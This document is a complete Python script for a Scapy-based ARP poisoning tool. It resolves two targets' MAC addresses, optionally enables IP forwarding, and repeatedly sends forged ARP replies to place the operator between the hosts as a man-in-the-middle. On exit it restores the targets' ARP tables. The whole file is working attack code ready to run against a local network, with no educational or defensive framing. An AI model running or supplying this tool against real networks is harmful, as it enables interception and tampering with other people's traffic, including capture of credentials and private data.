#! /usr/bin/env python3

import sys
from datetime import datetime
from time import sleep as pause
from scapy.all import *
from logging import getLogger, ERROR

try:
    getLogger('scapy.runtime').setLevel(ERROR)
    conf.verb = 0
except ImportError:
    print("[!] Failed to Import Scapy")
    sys.exit(1)


class PreAttack:
    def __init__(self, target, interface):
        self.target = target
        self.interface = interface

    def get_MAC_Addr(self):
        """
        get_MAC_Addr
        sends an ARP(Addres Resolution Protocol) request to the specified target IP address and waits for the response
        :return: returns source mac address
        """
        return srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=self.target), timeout=10, iface=self.interface)[0][0][1][
            ARP].hwsrc


class ToggleIPForward:
    def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
        self.path = path

    def enable_IP_Forward(self):
        with open(self.path, 'w') as file:
            file.write('1')
        return 1

    def disable_IP_Forward(self):
        with open(self.path, 'w') as file:
            file.write('0')
        return 0


class Attack:
    def __init__(self, targets, interface):
        self.target1 = targets[0]
        self.target2 = targets[1]
        self.interface = interface

    def send_Poison(self, MACs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACs[0]), iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACs[1]), iface=self.interface)

    def send_Fix(self, MACs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[0]),
             iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACs[1]),
             iface=self.interface)


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface',
                        default=False)
    parser.add_argument('-t1', '--target1', help='First target for poisoning', action='store', dest='target1',
                        default=False)
    parser.add_argument('-t2', '--target2', help='Second target for poisoning', action='store', dest='target2',
                        default=False)
    parser.add_argument('-f', '--forward', help='Auto-toggle IP forwarding', action='store_true', dest='forward',
                        default=False)
    parser.add_argument('-q', '--quiet', help='Disable feedback messages', action='store_true', dest='quiet',
                        default=False)
    parser.add_argument('--clock', help='Track attack duration', action='store_true', dest='time', default=False)
    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    elif not args.target1 or not args.target2:
        parser.error("Invalid target specification")
        sys.exit(1)
    elif not args.interface:
        parser.error("No network interface given")
        sys.exit(1)

    start_Time = datetime.now()
    targets = [args.target1, args.target2]
    print('[*] Resolving Target Addresses...', end='', flush=True)
    try:
        MACs = list(map(lambda x: PreAttack(x, args.interface).get_MAC_Addr(), targets))
        print('[DONE]')
    except Exception:
        print(' ![FAIL]\n[!] Failed to Resolve Target Address(es)')
        sys.exit(1)

    try:
        if args.forward:
            print('[*] Enabling IP Forwarding...', end='', flush=True)
            ToggleIPForward().enable_IP_Forward()
            print('[DONE]')
    except IOError:
        print('[FAIL]')
        try:
            choice = input('[*] Proceed with Attack? [y/N] ').strip().lower()[0]
            if choice == 'y':
                pass
            elif choice == 'n':
                print('[*] User Cancelled Attack')
                sys.exit(1)
            else:
                print('[!] Invalid Choice')
                sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)

    print('[*] Launching Attack...\n')
    while 1:
        try:
            try:
                Attack(targets, args.interface).send_Poison(MACs)
            except Exception:
                print('[!] Failed to Send Poison')
                sys.exit(1)
            if not args.quiet:
                print('[*] Poison Sent to %s and %s' % (targets[0], targets[1]))
            else:
                pass
            pause(2.5)
        except KeyboardInterrupt:
            break

    print('\n[*] Fixing Targets...', end='', flush=True)
    for _ in range(0, 16):
        try:
            Attack(targets, args.interface).send_Fix(MACs)
        except (Exception, KeyboardInterrupt):
            print('[FAIL]')
            sys.exit(1)
        pause(2)

    print('[DONE]')
    try:
        if args.forward:
            print('[*] Disabling IP Forwarding...', end='', flush=True)
            ToggleIPForward().disable_IP_Forward()
            print('[DONE]')
    except IOError:
        print('[FAIL]')

    if args.time:
        print('[*] Attack Duration: %s' % (datetime.now() - start_Time))
